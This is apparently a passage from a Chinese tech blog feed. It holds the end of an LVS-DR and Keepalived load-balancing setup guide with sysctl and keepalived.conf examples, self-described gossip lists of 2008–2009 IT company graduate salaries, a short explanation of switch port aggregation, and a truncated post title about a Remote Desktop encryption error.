class="line"></span><br><span class="line">\# Controls the System Request debugging functionality of the kernel</span><br><span class="line"></span><br><span class="line">kernel.sysrq = 0</span><br><span class="line"></span><br><span class="line">\# Controls whether core dumps will append the PID to the core filename.</span><br><span class="line"></span><br><span class="line">\# Useful for debugging multi-threaded applications.</span><br><span class="line"></span><br><span class="line">kernel.core\_uses\_pid = 1</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.lo.arp_ignore = 1</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.lo.arp_announce = 2</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.all.arp_ignore = 1</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.all.arp_announce = 2</span><br></pre></td></tr></table></figure></p><p>或者采用secondary ip address方式配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">\# vi /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">添加以下内容如上所示：</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.lo.arp_ignore = 1</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.lo.arp_announce = 2</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.all.arp_ignore = 1</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.all.arp_announce = 2</span><br><span class="line"></span><br><span class="line">#sysctl –p</span><br><span class="line"></span><br><span class="line">#ip addr add 61.164.122.8/32 dev lo</span><br><span class="line"></span><br><span class="line">#ip add list 查看是否绑定</span><br></pre></td></tr></table></figure></p><p>3. 启动lvs-dr脚本和realserver启本，在DR上可以查看LVS当前状态:</p><p>#watch ipvsadm –ln</p><p>五．利用Keepalvied实现负载均衡和和高可用性</p><p>1.配置在主负载均衡服务器上配置keepalived.conf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">#vi /etc/keepalived/keepalived.conf (主调度器)</span><br><span class="line"></span><br><span class="line">! Configuration File for keepalived</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line"></span><br><span class="line">   notification_email &#123;</span><br><span class="line"></span><br><span class="line">acassen@firewall.loc</span><br><span class="line"></span><br><span class="line">failover@firewall.loc</span><br><span class="line"></span><br><span class="line">sysadmin@firewall.loc</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   notification\_email\_from</span><br><span class="line"></span><br><span class="line">Alexandre.Cassen@firewall.loc</span><br><span class="line"></span><br><span class="line">   smtp_server 127.0.0.1</span><br><span class="line"></span><br><span class="line">   smtp\_connect\_timeout 30</span><br><span class="line"></span><br><span class="line">   router\_id LVS\_DEVEL</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp\_instance VI\_1 &#123;</span><br><span class="line"></span><br><span class="line">    state MASTER</span><br><span class="line"></span><br><span class="line">    interface eth0</span><br><span class="line"></span><br><span class="line">    virtual\_router\_id 51</span><br><span class="line"></span><br><span class="line">    priority 100</span><br><span class="line"></span><br><span class="line">    advert_int 1</span><br><span class="line"></span><br><span class="line">    authentication &#123;</span><br><span class="line"></span><br><span class="line">        auth_type PASS</span><br><span class="line"></span><br><span class="line">        auth_pass 1111</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line"></span><br><span class="line">        192.168.2.170</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">virtual_server 192.168.2.170 80 &#123;</span><br><span class="line"></span><br><span class="line">    delay_loop 6</span><br><span class="line"></span><br><span class="line">    lb_algo wrr</span><br><span class="line"></span><br><span class="line">    lb_kind DR</span><br><span class="line"></span><br><span class="line">    persistence_timeout 60</span><br><span class="line"></span><br><span class="line">    protocol TCP</span><br><span class="line"></span><br><span class="line">    real_server 192.168.2.171 80 &#123;</span><br><span class="line"></span><br><span class="line">        weight 3            </span><br><span class="line"></span><br><span class="line">        TCP_CHECK &#123;</span><br><span class="line"></span><br><span class="line">        connect_timeout 10   </span><br><span class="line"></span><br><span class="line">        nb\_get\_retry 3</span><br><span class="line"></span><br><span class="line">        delay\_before\_retry 3</span><br><span class="line"></span><br><span class="line">        connect_port 80</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    real_server 192.168.2.172 80 &#123;</span><br><span class="line"></span><br><span class="line">        weight 3</span><br><span class="line"></span><br><span class="line">        TCP_CHECK &#123;</span><br><span class="line"></span><br><span class="line">        connect_timeout 10</span><br><span class="line"></span><br><span class="line">        nb\_get\_retry 3</span><br><span class="line"></span><br><span class="line">        delay\_before\_retry 3</span><br><span class="line"></span><br><span class="line">        connect_port 80</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在备用调度器上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">#vi /etc/keepalived/keepalived.conf (备用调度器)</span><br><span class="line"></span><br><span class="line">! Configuration File for keepalived</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line"></span><br><span class="line">   notification_email &#123;</span><br><span class="line"></span><br><span class="line">acassen@firewall.loc</span><br><span class="line"></span><br><span class="line">failover@firewall.loc</span><br><span class="line"></span><br><span class="line">sysadmin@firewall.loc</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   notification\_email\_from</span><br><span class="line"></span><br><span class="line">Alexandre.Cassen@firewall.loc</span><br><span class="line"></span><br><span class="line">   smtp_server 127.0.0.1</span><br><span class="line"></span><br><span class="line">   smtp\_connect\_timeout 30</span><br><span class="line"></span><br><span class="line">   router\_id LVS\_DEVEL</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp\_instance VI\_1 &#123;</span><br><span class="line"></span><br><span class="line">    state BACKUP</span><br><span class="line"></span><br><span class="line">    interface eth0</span><br><span class="line"></span><br><span class="line">    virtual\_router\_id 51</span><br><span class="line"></span><br><span class="line">    priority 99</span><br><span class="line"></span><br><span class="line">    advert_int 1</span><br><span class="line"></span><br><span class="line">    authentication &#123;</span><br><span class="line"></span><br><span class="line">        auth_type PASS</span><br><span class="line"></span><br><span class="line">        auth_pass 1111</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line"></span><br><span class="line">        192.168.2.170</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">virtual_server 192.168.2.170 80 &#123;</span><br><span class="line"></span><br><span class="line">    delay_loop 6</span><br><span class="line"></span><br><span class="line">    lb_algo wrr</span><br><span class="line"></span><br><span class="line">    lb_kind DR</span><br><span class="line"></span><br><span class="line">    persistence_timeout 60</span><br><span class="line"></span><br><span class="line">    protocol TCP</span><br><span class="line"></span><br><span class="line">    real_server 192.168.2.171 80 &#123;</span><br><span class="line"></span><br><span class="line">        weight 3            </span><br><span class="line"></span><br><span class="line">        TCP_CHECK &#123;</span><br><span class="line"></span><br><span class="line">        connect_timeout 10   </span><br><span class="line"></span><br><span class="line">        nb\_get\_retry 3</span><br><span class="line"></span><br><span class="line">        delay\_before\_retry 3</span><br><span class="line"></span><br><span class="line">        connect_port 80</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    real_server 192.168.2.172 80 &#123;</span><br><span class="line"></span><br><span class="line">        weight 3</span><br><span class="line"></span><br><span class="line">        TCP_CHECK &#123;</span><br><span class="line"></span><br><span class="line">        connect_timeout 10</span><br><span class="line"></span><br><span class="line">        nb\_get\_retry 3</span><br><span class="line"></span><br><span class="line">        delay\_before\_retry 3</span><br><span class="line"></span><br><span class="line">        connect_port 80</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2. BACKUP服务器同上配置，先安装lvs再按装keepalived,仍后配置/etc/keepalived/keepalived.conf，只需将红色标示的部分改一下即可.</p><p>3. vi /etc/rc.local</p><p>   #/usr/local/sbin/lvs-dr.sh  将lvs-dr.sh这个脚本注释掉。</p><p>   #/usr/local/sbin/lvs-dr.sh stop 停止lvs-dr脚本</p><p>   #/etc/init.d/keepalived start  启动keepalived 服务，keepalived就能利用keepalived.conf 配</p><p>   置文件，实现负载均衡和高可用.</p><p>4. 查看lvs服务是否正常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#watch ipvsadm –ln</span><br><span class="line"></span><br><span class="line">IP Virtual Server version 1.2.1 (size=4096)</span><br><span class="line"></span><br><span class="line">Prot LocalAddressort Scheduler Flags</span><br><span class="line"></span><br><span class="line">  -\&gt; RemoteAddressort           Forward Weight ActiveConn InActConn</span><br><span class="line"></span><br><span class="line">TCP  61.164.122.8:80 wrr persistent 60</span><br><span class="line"></span><br><span class="line">  -\&gt; 61.164.122.10:80            Route   3      0          0</span><br><span class="line"></span><br><span class="line">  -\&gt; 61.164.122.9:80             Route   3      0          0</span><br><span class="line"></span><br><span class="line">#tail –f /var/log/message  监听日志，查看状态，测试LVS负载均衡及高可用性是否有效。</span><br></pre></td></tr></table></figure></p><p>5．停Master服务器的keepalived服务，查看BAKCUP服务器是否能正常接管服务。</p><p>四．相关参考</p><p>1．LVS 基础知识汇总</p><p>LVS的算法介绍            </p><p><a href="http://www.linuxtone.org/viewthread.php?tid=69" target="_blank" rel="noopener">http://www.linuxtone.org/viewthread.php?tid=69</a></p><p>学习LVS的三种转发模式     </p><p><a href="http://www.linuxtone.org/viewthread.php?tid=77" target="_blank" rel="noopener">http://www.linuxtone.org/viewthread.php?tid=77</a></p><p>LVS中的IP负载均衡技术     </p><p><a href="http://www.linuxtone.org/viewthread.php?tid=68" target="_blank" rel="noopener">http://www.linuxtone.org/viewthread.php?tid=68</a></p><p>更多的请到</p><p><a href="http://www.linuxtone.org" target="_blank" rel="noopener">http://www.linuxtone.org</a></p><p>负载均衡版查看</p><p>Keepalived 相关参考资料。</p><p><a href="http://www.keepalived.org/documentation.html" target="_blank" rel="noopener">http://www.keepalived.org/documentation.html</a></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>2009年IT公司薪水统计（八卦）</title>
      <link href="/2010/01/21/2009-it-company-salary-statistics-gossip/"/>
      <url>/2010/01/21/2009-it-company-salary-statistics-gossip/</url>
      <content type="html"><![CDATA[<p>Morgan IT 18万＋bonus，共25万左右</p><p>Google 17万9千多</p><p>NI 拿到手14万，四金全部是公司交。</p><p>MS atc 15.3万</p><p>百度 7000至8500，发14个月，每个季度有4500至6000的奖金。</p><p>美国道富银行IT部 8000至12000，发15个月</p><p>浙大网新恒天  9500×15</p><p>网易杭州研究院  9000至10000，发14个月</p><p>ask.com  9000至12000，发14个月</p><p>IBM CRL  (7500+800+900)*12+7500*2.5+3.3万（住房补贴，三年10万，平均到一年。）</p><p>IBM CDL   (7500+800)*12+7500*2.5+3.3万</p><p>nVidia  测试8000×15，研发10000×15，有期权。</p><pre><code>（另一说是9000×13，有期权）</code></pre><p>Trilogy 16万左右</p><p>上海威盛 7500×13，不再提供宿舍</p><p>杭州威盛 6000×13</p><p>UT斯达康 6500/月，福利不错</p><p>腾讯 7000×13，年终奖金15000，但是没有住房公积金</p><p>MicroStategy 杭州职位每月12000，14个月，美国职位待遇不详</p><p>泰鼎 8000×13，年终奖2个月薪水左右</p><p>上海展讯 6500至7000，发14－16个月，有期权</p><p>Intel 8000×13，加上一些补贴</p><p>华为 5500+1000，年终奖不定，几千到几万都有可能。</p><p>中兴 8－10万</p><p>Morgan IT：  18万＋bonus，共25万左右。我班一个很低调的小伙貌似搞定了。</p><p>Google：     17万9千多。今年交大只听说一个很强的女生搞定了，其他的一些大牛都挂了。</p><p>微软：       15.3万</p><p>NI：         拿到手14万，四金全部是公司交。</p><p>百度：       系统部16W。新产品搜索的offer17.8W。</p><p>中船舶系统工程部：   据说年薪可达20W，对成绩要求比较高。</p><p>恩杰ASK.com：       9000至12000，发14个月</p><p>美国道富：    很轻松,待遇7500。几个月知道，同学有拿到的也有去的，不过感觉并没有想象中的那么多。</p><p>浙大网新：   9000,8000,7000*13，分为几个级别，主要看你面试和笔试成绩，然后还有两个月的浮动奖金</p><p>网易杭州研究院：  9000至10000，发14个月</p><p>美国虹软（杭州）：  6000*14。</p><p>IBM CRL：       (7500+800+900)*12+7500*2.5+3.3万（住房补贴，三年10万，平均到一年。）</p><p>IBM CDL：       (7500+800)*12+7500*2.5+3.3万</p><p>EMC：           12000/月，福利超好，有股票和期权，而且很轻松。</p><p>Autodesk：      8.5k×12＋年奖</p><p>Intel：         8k×13，各种补贴较多</p><p>思爱普SAP：      约13万</p><p>意法半导体：     约10万</p><p>博奥杰BO：      8.5k×13</p><p>Cisco：         约13万</p><p>nVidia：        测试8000×15，研发10000×15，有期权。(另一说9000×13,有期权)</p><p>Trilogy：       16万左右</p><p>趋势科技：       OFFER上说10W多一点，斜对面宿舍有一个同学去了，企业氛围很好地说。</p><p>上海威盛：       7500×13，不再提供宿舍.</p><p>上海博朗软件：    6500/月，年终奖金最多2个月工资。</p><p>群硕软件（上海）：7500/月，外包，显示器都是CRT的。</p><p>杭州威盛：        6500×13</p><p>苏州瑞晟realtek： 8.5K*13，住房公积金占22%，其他五险什么都有，还有很多其他待遇，企业培训很好。</p><p>苏州诚致：        (7400+600)*13,年终奖金0-3个月基本工资。</p><p>UT斯达康：        6500/月，福利不错</p><p>腾讯：            7000×13，年终奖金15000，但是没有住房公积金</p><p>MicroStategy：    杭州职位每月12000，14个月，美国职位待遇不详</p><p>泰鼎：             8000×13，年终奖2个月薪水左右</p><p>NEC北京：          6000/月，加班费另算，号称解决户口的能力很强。</p><p>雅虎中国：         7000*12，年终奖金0-3个月基本工资，每月还有一些补助。</p><p>淘宝网研发：       6000/月。</p><p>上海展讯：         6500至7000，发14－16个月，有期权</p><p>华为：             5500+1000，年终奖不定，几千到几万都有可能。</p><p>中兴：             8－10万</p><p>ATI：              8.5k×13</p><p>安捷伦：           约11万</p><p>育碧：             约10万</p><p>Dows IT：          7.1k*13，福利较好</p><p>豪威微电子：        8.5k×13</p><p>波士顿咨询：        约15万</p><p>Marvell：          9.5k×12</p><p>神州数码：        5000*16个月，其他不知道不过不少人把它拒了或者毁约不知道为什么，分笔试和面试。</p><p>珠海矩力：        6500*14个月还有年终奖感觉还可以，招聘从组织上来说不错。</p><p>深圳睿初：        10K*13，</p><p>大唐：            8-10w，承诺是给16个月工资，同学有拿到OFFER的，也有毁约的。</p><p>台达能源（上海）： 6K*17，当然这里面包括了奖金</p><p>网易：           同学拿到OFFER了，面试官问：你期望待遇多少？他咬咬牙说：8K，结果直</p><pre><code>接说没问题。可见待遇在这个之上，年薪11W左右</code></pre><p>中国平安保险：    待遇5.8K+其他一些补助和补贴每月。年薪8W左右（硕士）。</p><p>深圳迈瑞：        宣传上说是10W以上，待遇还可以在电子生物医疗方面排名前四。</p><p>步步高：          试用期是4900，转正后是5200还有一些年终奖。</p><p>华硕：            6500*12+年底奖金和项目奖金，不过没有人签，应该名声不好。</p><p>阿尔卡特青岛朗讯： 7500*13.面试就2面，英语口语好，其他的不是太差就给OFFER，</p><p>飞索半导体（Spansion）面试态度很好，面试几次都送礼物，而且最后一次请我们吃了个饭哈哈。那个老总很nice,以前在微软做主管。技术人也很nice. 据说待遇（去年去的师兄）：7K*13，其他的具体保险公积金等不知道怎么算的。不过飞索是亚洲最佳雇主不是盖的，还是很人道的，我也体验过了呵呵。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>三十五家大型IT企业待遇曝光</title>
      <link href="/2010/01/21/the-treatment-of-35-large-it-enterprises-has-been-exposed/"/>
      <url>/2010/01/21/the-treatment-of-35-large-it-enterprises-has-been-exposed/</url>
      <content type="html"><![CDATA[<p>以自己的经历和周围同学的待遇情况，将所知道的公司的待遇，公司招聘人员的态度，公司的好坏，招聘诚信度全部列出来，当然是指2008年的校园招聘。</p><p>　　1。浙大网新待遇：9000,8000,7000*13，分为几个级别，主要看你面试和笔试成绩，然后</p><p>　　还有两个月的浮动奖金，住房公积金也有。保险也有，和微软一起工作，工作后应该可以跳到微软，感觉笔试组织的很混乱我当时收到电话去笔试结果竟然没有试卷去抢了份题答了，迟到了30多分钟答题。</p><p>　　2。美国道富：很轻松,待遇7500。几个月知道，同学有拿到的也有去的，不过感觉并没有想象中的那么多。</p><p>　　3。神州数码：5000*16个月，其他不知道不过不少人把它拒了或者毁约不知道为什么，分笔试和面试。</p><p>　　4。珠海矩力：6500*14个月还有年终奖感觉还可以，招聘从组织上来说不错。</p><p>　　5。深圳睿初：10K*13，听说是被AMSL(阿斯麦)给收购了，面试3次全是技术和算法，最后还有一轮美国总部的面试。感觉面试管态度很好，而且说2个星期后给通知就给通知了，总的来说诚信度还可以。</p><p>　　6。IBM(CDSL)：7500*13+800*12，同学有五个去那边了，四个做硬件的，一个做软件的。</p><p>　　7。趋势科技：OFFER上说10W多一点，有一个同学去了，也有一个同学把它给拒了，面试听说人也很好。</p><p>　　8。大唐：8-10w，承诺是给16个月工资，同学有拿到OFFER的，也有毁约的。</p><p>　　9。百度：今年给16W，商务搜索部门和市场部门差不多都这个价。同学拿到OFFER了，因为要实习老板不让走，把它拒了，来得比较早，笔试场面很宏大。牛人也n多。不过感觉时间太久了，过了一个多月才给回复。要么据信要么给OFFER。要实习一个月。</p><p>　　10。intel今年不知道为什么很少，才给5000，我同学直接拒掉了。</p><p>　　11。realtek：8。5K*13，住房公积金占22%，其他五险什么都有，还有很多其他待遇，而且毁约也不是很难，当然除非你很猛，才会毁约。比如说拿到nvidia的OFFER。</p><p>　　12。台达能源(上海)研发中心：6K*17，当然这里面包括了奖金，真正拿到的应该没那么多。不过公司包吃，到是可以省很多钱。相当于7K*17吧，反正师兄在里面是税后6。2K，税前应该有8K多吧。招聘人员态度也相当好。</p><p>　　13。杭州ECI，来学校招聘时你写多少就给多少，当时煞笔的很，感觉写个6.5K还挺不好意思，结果写那么多就直接给了，还加2k的伙食和住房补贴。所以如果有招聘要写期望待遇的就多写点，招聘人员态度很好。</p><p>　　14。中兴：很少才5.8K，在实习期才4.5K，做海外销售可能多一点，而且感觉招聘的人很拽似的，明明说你可以了，结果却让你久等或者当候补，当时却不说清楚。鄙视之，毁约也很麻烦。</p><p>　　15。华为：工资5500+1000，面试整体感觉不太好，就是走个形式，给你考虑得时间很少，而且如果你当时没有协议就不让你签了，丝毫不给机会让我毁约。毁约很麻烦。</p><p>　    16。网易待遇：同学拿到OFFER了，面试官问：你期望待遇多少?他咬咬牙说：8K，结果直接说没问题。可见待遇在这个之上，年薪11W左右，而且给你20天的考虑时间，总体来说不错。</p><p>　　17。Thomson,不知道给多少，Tencent据说是硕士7500，一年能拿10w多一点，不过腾讯毁约起来很是麻烦，到明年4月份才给你寄，所以签之前考虑清楚，因为这样好多同学都拒它。</p><p>　　18。深圳宇龙通信：招聘人员态度很好，承诺是年薪102800.不过硕士一面就给OFFER，所以感觉是相当的假，网上说是经常加班，不过没有去所以不作评论。</p><p>　　19。中国平安保险：待遇5.8K+其他一些补助和补贴每月。年薪8W左右(硕士)。不过要用Java+linux+oracle.对于搞嵌入式的来说不是很适合，不过硕士都可以学习的，在前两个月去平安大学培训，所以违约费用很高，毕竟人家培训过你。</p><p>　　20。威盛：待遇估计7500左右。</p><p>　　21。深圳迈瑞：宣传上说是10W以上，待遇还可以在电子生物医疗方面排名前四。2005年还是第一位，前两个星期拉去山上培训。</p><p>　　22。富士康：公司非议很多，印象不是很好，这边基本上没人去考虑，就不做评论反正没有去管它。</p><p>　　23。步步高：试用期是4900，转正后是5200还有一些年终奖。</p><p>　　24。华硕：6500*12+年底奖金和项目奖金，不过没有人签，应该名声不好。</p><p>　　25。阿尔卡特青岛朗讯：7500*13.面试就2面，英语口语好，其他的不是太差就给OFFER，前3-6个月会去美国搞技术培训，至少面试官这样跟我说的，具体的能不能做到不知道了。招聘人员态度很好，感觉很nice，其实我很想去的，毕竟以后跳到别的外企也轻松点。但是老婆不允许!!!!气死我了。</p><p>　　26。超图(5000或者4000看你做核心开发还是其他开发)，久其软件(4000的基本工资)，中体彩(4500基本工资+700补助)(北京)。</p><p>　　27。中电14所(最鄙视，妈的当时告诉我(原话):我们拿的笔华为多，它们只是刚开始那么多。我们越来越多)</p><p>　　28。云南电力：3000块。</p><p>　　29。深圳招商融博(10W左右)</p><p>　　30。上海sim(晨讯科技)工资5K，加上其他的补贴年薪估计是7。2w到8W之间吧，总体来讲待遇很差，师兄有在里面的。</p><p>　　31。上海先锋：硕士工资给7K，具体其他不太清楚了。</p><pre><code>32。应用材料(AM):工资很一般不是很多，5K*16?不清楚(呵呵看过两天给不给OFFER再说。)不过听说出差费用很高，可以拿到2w/月了，而且面试时面试官说他们基本上50%的时间在国外，可见出差的比例很大.软件开发面试是几个老外。</code></pre><p>　　33。飞索半导体(Spansion)面试态度很好，面试几次都送礼物，而且最后一次请我们吃了个饭哈哈。那个老总很nice,以前在微软做主管。技术人也很nice.据说待遇(去年去的师兄)：7K*13，其他的具体保险公积金等不知道怎么算的。不过飞索是亚洲最佳雇主不是盖的，还是很人道的，我也体验过了呵呵。</p><p>　　34。中科院光电研究院：工资5K，解决北京户口。</p><p>　　35。中科大洋：听说是工资7K，而且解决北京户口，晕，都没听过，不过同学有那到，不知道去了没有。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>端口汇聚</title>
      <link href="/2010/01/20/port-together/"/>
      <url>/2010/01/20/port-together/</url>
      <content type="html"><![CDATA[<pre><code> 端口汇聚是将多个端口聚合在一起形成 1个汇聚组，以实现出/入负荷在各成员端口中的分担，同时也提供了更高的连接可靠性。端口汇聚可以分为手工汇聚、动态LACP 汇聚和静态 LACP 汇聚。同一个汇聚组中端口的基本配置应该保持一致，即如果某端口为 Trunk端口，则其他端口也配置为 Trunk端口；如该端口的链路类型改为 Access端口，则其他端口的链路类型也改为 Access端口。  端口的基本配置主要包括 STP、QoS、VLAN、端口等相关配置。其中 STP配置包括：端口的 STP使能/关闭、与端口相连的链路属性（如点对点或非点对点）、STP优先级、路径开销、报文发送速率限制、是否环路保护、是否根保护、是否为边缘端口。QoS配置包括：流量限速、优先级标记、缺省的 802.1p优先级、带宽保证、  </code></pre><p>拥塞避免、流重定向、流量统计等。VLAN 配置包括：端口上允许通过的 VLAN、端口缺省 VLAN ID。端口配置包括：端口的链路类型，如 Trunk、Hybrid、Access属性。</p><p>一台S8500系列路由交换机最多可以配置920个汇聚组，其中1～31为手工或者静态聚合组；32～64为预留组号；65～192为Routed Trunk；193～920为动态聚合组。</p><p>系统中存在MPLS VPN单板时，只支持7个负载分担聚合组，没有MPLS VPN单板时，可以支持31组负载分担组，对于FE单板（采用EX芯片），只支持7个负载分担聚合组。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>关于远程桌面出现：“由于数据加密错误，这个会话将结束。请重新连接到远程计算机。”</title>
      <link href="/2010/01/18/about-remote-desktop-presence-this-session-will-end-due-to-data-encryption-errors-please-reconnect-to-the-remote-computer/"/>
      <url>/2010/01/18/about-remote-desktop-presence-this-session-will-end-due-to-data-encryption-errors-please-reconnect-to-the-remote-computer/</url>
